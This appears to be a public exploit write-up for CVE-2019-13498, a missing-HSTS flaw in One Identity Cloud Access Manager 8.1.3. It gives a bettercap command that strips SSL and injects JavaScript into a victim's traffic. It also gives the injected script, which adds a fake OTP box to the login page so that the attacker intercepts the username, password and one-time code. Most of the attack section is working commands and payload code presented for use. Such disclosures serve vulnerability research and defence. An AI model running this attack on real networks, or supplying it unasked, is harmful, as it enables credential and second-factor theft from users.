# CVE-2019-13498

Exploit Title: MITM - Missing HSTS causing credential theft and content manipulation<br>
Date: 07/10/2019<br>
Exploit Author: Furqan Khan<br>
Vendor Homepage: https://www.oneidentity.com/<br>
Software Link: https://www.oneidentity.com/products/cloud-access-manager/<br>
Version: 8.1.3<br>
Tested on: Kali Linux , Windows 7 ,Ubantu 16.04<br>

#### To conduct the MITM attack and steal username , password and OTP , we make use of bettercap 1.6.Ideally , the OTP box is populated at the second page of the application , after the user sucessfully autheticates with a legitimate username and password. However we use SSL strip and content manupulation to inject a OTP text box at the same page where username and password are prompted. A victim may think this change is comming from application itself , and shall share username , password and OTP and submit the form.The attacker who has set up bettercap and proxy , will get the credentials and OTP , and shall use the same to login to the application.


# The bettercap command used is :
##### bettercap -T 192.168.1.103 --proxy -P post --proxy-module injectjs --js-file inject_js.js ####

![bettercap.jpg](https://github.com/FurqanKhan1/CVE-2019-13498/blob/master/1.PNG)

Here 192.168.1.103 is the IP address of the victim. If we do not know it , we can use bettercap , to sniff and manipulate content of the entire LAN (common network of attacker and victim)

## The content of inject_js.js is given as under ##

```html
<script>
 
function replace_payload()
{  


     var append_str='<div class="wrap-input100 validate-input m-b-20" data-validate="Password"><input class="cui-textbox" type="password"  id="passwordTextbox" name="passwordTextbox"><span class="focus-cui-textbox" data-placeholder="OTP"></span></div>';

     var text_div=$(".m-b-20");

     text_div.append(append_str);

    }

    function control(){setTimeout(replace_payload,2000);} control();
    
</script>
```
##### Now when the victim would browse the product (Cloud access manager) , due to cache piosining and SSL strip (Bettercap) ,an OTP text box will be injected in the page that would be served to victim via the injected javascript snippet #####
![injected.jpg](https://github.com/FurqanKhan1/CVE-2019-13498/blob/master/2.PNG)

##### Given that the connection is downgraded to http via ssl-strip , now all traffic shall be visible to the attacker.Thus we can intercept the traffic , and see the username , password and OTP submitted by victim. #####

![intercept.jpg](https://github.com/FurqanKhan1/CVE-2019-13498/blob/master/3.PNG)

#####  Bingo ! That was easy ! #####
